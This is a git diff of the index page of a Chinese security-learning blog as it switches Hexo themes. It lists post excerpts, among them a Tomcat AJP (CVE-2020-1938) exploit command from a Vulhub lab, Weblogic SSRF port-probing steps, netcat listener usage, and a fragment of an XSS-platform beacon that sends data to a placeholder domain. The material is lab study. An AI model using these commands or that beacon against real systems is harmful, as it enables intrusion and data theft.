@@ -1,315 +1,103 @@
-<!DOCTYPE html>
-
-
-
-  
-
-
-<html class="theme-next mist use-motion" lang="zh-Hans">
-<head>
-  <meta charset="UTF-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
-<meta name="theme-color" content="#222">
-
-
-
-
-
-
-
-
-
-<meta http-equiv="Cache-Control" content="no-transform" />
-<meta http-equiv="Cache-Control" content="no-siteapp" />
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
-
-
-
-
-
-
-
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
-
-<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
-
-
-  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
-
-
-
-
-
-  <meta name="keywords" content="Hexo, NexT" />
-
-
-
-
-
-
-
-
-
-
-<meta property="og:type" content="website">
-<meta property="og:title" content="Oah&#39;s Blog">
-<meta property="og:url" content="http://yoursite.com/index.html">
-<meta property="og:site_name" content="Oah&#39;s Blog">
-<meta property="article:author" content="Oah">
-<meta name="twitter:card" content="summary">
-
-
-
-<script type="text/javascript" id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Mist',
-    version: '5.1.4',
-    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
-    fancybox: true,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    duoshuo: {
-      userId: '0',
-      author: '博主'
-    },
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Oah's Blog</title><meta name="description"><meta name="author" content="Oah"><meta name="copyright" content="Oah"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://xshisme.github.io/"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><meta property="og:type" content="website"><meta property="og:title" content="Oah's Blog"><meta property="og:url" content="https://xshisme.github.io/"><meta property="og:site_name" content="Oah's Blog"><meta property="og:description"><meta property="og:image" content="https://xshisme.github.io/img/avatar.png"><meta property="article:published_time" content="2020-08-06T11:34:01.861Z"><meta property="article:modified_time" content="2020-08-06T11:34:01.861Z"><meta name="twitter:card" content="summary"><script>var activateDarkMode = function () {
+  document.documentElement.setAttribute('data-theme', 'dark')
+  if (document.querySelector('meta[name="theme-color"]') !== null) {
+    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#000')
+  }
+}
+var activateLightMode = function () {
+  document.documentElement.setAttribute('data-theme', 'light')
+  if (document.querySelector('meta[name="theme-color"]') !== null) {
+    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#fff')
+  }
+}
+
+var getCookies = function (name) {
+  const value = `; ${document.cookie}`
+  const parts = value.split(`; ${name}=`)
+  if (parts.length === 2) return parts.pop().split(';').shift()
+}
+
+var autoChangeMode = 'false'
+var t = getCookies('theme')
+if (autoChangeMode === '1') {
+  var isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+  var isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+  var isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+  if (t === undefined) {
+    if (isLightMode) activateLightMode()
+    else if (isDarkMode) activateDarkMode()
+    else if (isNotSpecified || hasNoSupport) {
+      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
+      var now = new Date()
+      var hour = now.getHours()
+      var isNight = hour <= 6 || hour >= 18
+      isNight ? activateDarkMode() : activateLightMode()
     }
-  };
-</script>
-
-
-
-  <link rel="canonical" href="http://yoursite.com/"/>
-
-
-
-
-
-  <title>Oah's Blog</title>
-  
-
-
-
-
-
-
-
-
-<meta name="generator" content="Hexo 4.2.0"></head>
-
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
-
-  
-  
-    
-  
-
-  <div class="container sidebar-position-left 
-  page-home">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta ">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/"  class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Oah's Blog</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-      
-        <p class="site-subtitle"></p>
-      
-  </div>
-
-  <div class="site-nav-toggle">
-    <button>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
-  </div>
-</div>
-
-<nav class="site-nav">
-  
-
-  
-    <ul id="menu" class="menu">
-      
-        
-        <li class="menu-item menu-item-home">
-          <a href="/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
-            
-            首页
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-tags">
-          <a href="/tags/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
-            
-            标签
-          </a>
-        </li>
-      
-        
-        <li class="menu-item menu-item-archives">
-          <a href="/archives/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
-            
-            归档
-          </a>
-        </li>
-      
-
-      
-    </ul>
-  
-
-  
-</nav>
-
-
-
- </div>
-    </header>
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          <div id="content" class="content">
-            
-  <section id="posts" class="posts-expand">
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/9999/09/09/%E8%B5%84%E6%BA%90%E6%94%B6%E8%97%8F/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Oah">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Oah's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/9999/09/09/%E8%B5%84%E6%BA%90%E6%94%B6%E8%97%8F/" itemprop="url">【置顶】资源收藏</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="9999-09-09T00:00:00+08:00">
-                9999-09-09
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-          
+    window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+      if (Cookies.get('theme') === undefined) {
+        e.matches ? activateDarkMode() : activateLightMode()
+      }
+    })
+  } else if (t === 'light') activateLightMode()
+  else activateDarkMode()
+} else if (autoChangeMode === '2') {
+  now = new Date()
+  hour = now.getHours()
+  isNight = hour <= 6 || hour >= 18
+  if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+  else if (t === 'light') activateLightMode()
+  else activateDarkMode()
+} else {
+  if (t === 'dark') activateDarkMode()
+  else if (t === 'light') activateLightMode()
+}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  bookmark: {
+    message_prev: '按',
+    message_next: '键将本页加入书签'
+  },
+  runtime_unit: '天',
+  runtime: false,
+  copyright: undefined,
+  ClickShowText: undefined,
+  medium_zoom: false,
+  fancybox: true,
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  baiduPush: false,
+  highlightCopy: true,
+  highlightLang: true,
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: false    
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: false,
+  isHome: true,
+  isHighlightShrink: false,
+  isSidebar: false,
+  postUpdate: '2020-08-06 19:34:01'
+}</script><noscript><style>
+#nav {
+  opacity: 1
+}
+.justified-gallery img {
+  opacity: 1
+}
+</style></noscript><meta name="generator" content="Hexo 4.2.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" data-lazy-src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">46</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">15</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div></div></div><div id="body-wrap"><header class="full_page" id="page-header" style="background-image: url(/img/lucency.png)"><nav id="nav"><span class="pull-left" id="blog_name"><a class="blog_title" id="site-name" href="/">Oah's Blog</a></span><span class="pull-right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div><span class="toggle-menu close"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="site-info"><h1 id="site_title">Oah's Blog</h1><div id="site_subtitle"><span id="subtitle"></span></div></div><div id="scroll_down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout_page" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/9999/09/09/%E8%B5%84%E6%BA%90%E6%94%B6%E8%97%8F/" title="【置顶】资源收藏">【置顶】资源收藏</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="9999-09-08T16:00:00.000Z" title="发表于 9999-09-09 00:00:00">9999-09-09</time></span></div><div class="content">
 
 网站
 SecWiki
@@ -328,265 +116,56 @@ Hacking8
 JSRC安全小课堂
 漏洞银行
 zero day initiative
-Zero Securit
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/9999/09/09/%E8%B5%84%E6%BA%90%E6%94%B6%E8%97%8F/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
+Zero Security
+CTF Wiki
+MDN Web 文档
+2017 OWASP TOP 10
+Web Hacking 101 中文版
+知道创宇研发技能表
 
-    
+平台
+Vulhub
+火线安全平台
+各种Web安全在线练习平台
+攻防世界
+爬虫闯关
 
-    
+工具
+每天新增的CVE信息
+国内外临时匿名邮箱及接收手机短信验证码网站
+在线Sage
+大数因式分解
+have i been pwned?
+Firefox Monitor
+BootCDN
+Many Time Pad
+FOFA
+jQuery漏洞查询
+Hacked.com.cn在线工具
+Bugku在线工具
+数学公式生成
+SRC信息收集
+RapidDNS
+PDF Candy - 使用在线 PDF 编辑器免费编辑 PDF
+Beekeeper Studio
 
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/08/04/Vulhub%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%85%AD%EF%BC%89/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Oah">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Oah's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/08/04/Vulhub%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%85%AD%EF%BC%89/" itemprop="url">Vulhub学习（六）</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-08-04T09:54:07+08:00">
-                2020-08-04
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-          Aapache Tomcat AJP 文件包含漏洞（CVE-2020-1938）漏洞复现下载 EXP，使用方法
+博客
+腾讯安全玄武实验 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2020/08/04/Vulhub%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%85%AD%EF%BC%89/" title="Vulhub学习（六）">Vulhub学习（六）</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-08-04T01:54:07.000Z" title="发表于 2020-08-04 09:54:07">2020-08-04</time></span></div><div class="content">Aapache Tomcat AJP 文件包含漏洞（CVE-2020-1938）漏洞复现下载 EXP，使用方法
 1python tomcat.py read_file --webapp=ROOT/ /index.jsp your-ip
 
 成功读取到 index.jsp
 
 漏洞原理分析
-测试环境为 W
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2020/08/04/Vulhub%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%85%AD%EF%BC%89/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
+测试环境为 Windows10
 
-    
+EXP 分析还是之前下载的 EXP，在 tomcat.py 的 perform_request 函数中插入一段代码，打印出发送的请求，如图所示
 
-    
+打印出来的请求如下
 
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/29/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Oah">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Oah's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/07/29/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" itemprop="url">Linux常用命令</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-29T09:38:54+08:00">
-                2020-07-29
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-          nc经常用来监听接收数据
+可以看出触发漏洞的代码在 attributes 中，接下来远程调试的时候需要重点关注这个参数的处理过程
+远程调试配置 Tomcat下载 Tomcat 8.0.52 并解压出 apache-tomcat-8.0.52 目录
+编辑 apache-tomcat-8.0.52/bin/catalina.bat，找到下面这一段，将 ip 改成主机的内网或公网 ip，端口改成自己想要的
+123if not "%JPDA_ADDRESS%" == "" goto gotJpdaAddressset JPDA_ADDRES ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2020/07/29/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" title="Linux常用命令">Linux常用命令</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-07-29T01:38:54.000Z" title="发表于 2020-07-29 09:38:54">2020-07-29</time></span></div><div class="content">nc经常用来监听接收数据
 1nc -lnvp 127.0.0.1:8080
 
 参数
@@ -610,262 +189,79 @@ Zero Securit
 
 
 -i&lt;延迟秒数&gt;
-
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2020/07/29/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
+设置时间间隔，以便传送信息及扫描通信端口
 
 
-    
-      
+-l
+使用监听模式，管控传入的资料
 
-  
 
-  
-  
-  
+-n
+直接使用IP地址，而不通过域名服务器
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/28/SpringBoot%E5%AD%A6%E4%B9%A0/">
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Oah">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
+-o&lt;输出文件&gt;
+指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存
 
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Oah's Blog">
-    </span>
 
-    
-      <header class="post-header">
+-p&lt;通信端口&gt;
+设置本地主机使用的通信端口
 
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/07/28/SpringBoot%E5%AD%A6%E4%B9%A0/" itemprop="url">SpringBoot学习</a></h1>
-        
 
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-28T15:19:09+08:00">
-                2020-07-28
-              </time>
-            
+-r
+乱数指定本地与远端主机的通信端口
 
-            
 
-            
-          </span>
+-s&lt;来源地址&gt;
+设置本地主机送出数据包的IP地址
 
-          
 
-          
-            
-          
+-u
+使用UDP传输协议
 
-          
-          
 
-          
+-v
+显示指令执行过程
 
-          
 
-          
+-w&lt;超时秒数&gt;
+设置等待连线的时间
 
-        </div>
-      </header>
-    
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
+-z
+使用0输入/输出模式，只在扫描通信端口时使用
 
-      
-      
 
-      
-        
-          
-          安装Maven下载安装到官网下载Binary zip archive
+tar常用参数
+
+
+参数
+功能
+
+
+
+-c
+建立压缩档案
+
+
+-x
+解压
+
+
+-t
+查看内容
+
+
+-r
+向压缩归档文件末尾追加文 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2020/07/28/SpringBoot%E5%AD%A6%E4%B9%A0/" title="SpringBoot学习">SpringBoot学习</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-07-28T07:19:09.000Z" title="发表于 2020-07-28 15:19:09">2020-07-28</time></span></div><div class="content">安装Maven下载安装到官网下载Binary zip archive
 新建一个Maven目录，将压缩包解压到该目录下。并且创建一个MavenRepository文件夹，用作本地Maven仓库
 
-修改Maven配置找到配置文件 Maven\apache-maven-3.6.3\conf\setting
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2020/07/28/SpringBoot%E5%AD%A6%E4%B9%A0/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
+修改Maven配置找到配置文件 Maven\apache-maven-3.6.3\conf\settings.xml
+添加本地仓库路径找到下面这段注释
+123456&lt;!-- localRepository | The path to the local repository maven will use to store artifacts. | | Default: $&#123;user.home&#125;/.m2/repository&lt;localRepository&gt;/path/to/local/repo&lt;/localRepository&gt;--&gt;
 
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/23/Vulhub%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Oah">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Oah's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/07/23/Vulhub%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89/" itemprop="url">Vulhub学习（五）</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-23T09:56:36+08:00">
-                2020-07-23
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-          
+在下面加上本地Maven仓库的路径
+1234567&lt;!-- localRepository | The path to the local repository maven will use to s ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2020/07/23/Vulhub%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89/" title="Vulhub学习（五）">Vulhub学习（五）</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2020-07-23T01:56:36.000Z" title="发表于 2020-07-23 09:56:36">2020-07-23</time></span></div><div class="content">
 Weblogic SSRF漏洞
 
 漏洞复现启动环境
@@ -873,392 +269,38 @@ Weblogic SSRF漏洞
 
 访问 http://[your-ip]:7001/uddiexplorer/
 点击Search Public Registries
-跳转到 http:/
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2020/07/23/Vulhub%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%94%EF%BC%89/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
+跳转到 http://[your-ip]:7001/uddiexplorer/SearchPublicRegistries.jsp 页面
+点击Search，抓包
 
-    
+Vulhub上的例子是发送GET请求，但是我发现页面上只有POST请求的入口，虽然直接编辑GET请求包可以复现漏洞，但还是跟着页面逻辑使用POST请求
 
-    
+将参数 operator 的值改为任意url，可以探测内网主机
+改成 127.0.0.1:7001 返回404，说明该主机端口开放
 
-    
+改成 127.0.0.1:80 返回could not connect，说明该主机端口不开放
 
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/23/XSS%E5%B9%B3%E5%8F%B0%E7%A0%94%E7%A9%B6/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Oah">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Oah's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/07/23/XSS%E5%B9%B3%E5%8F%B0%E7%A0%94%E7%A9%B6/" itemprop="url">XSS平台研究</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-23T09:35:38+08:00">
-                2020-07-23
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-          XSS平台研究代码1234567891011121314151617181920212223242526272829303132(function() &#123;    (new Image())    .src = 'https://&#123;domain&#125;?do=api&amp;i
-          ...
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2020/07/23/XSS%E5%B9%B3%E5%8F%B0%E7%A0%94%E7%A9%B6/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/07/22/Redis%E5%8F%8D%E5%BC%B9Shell/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Oah">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Oah's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
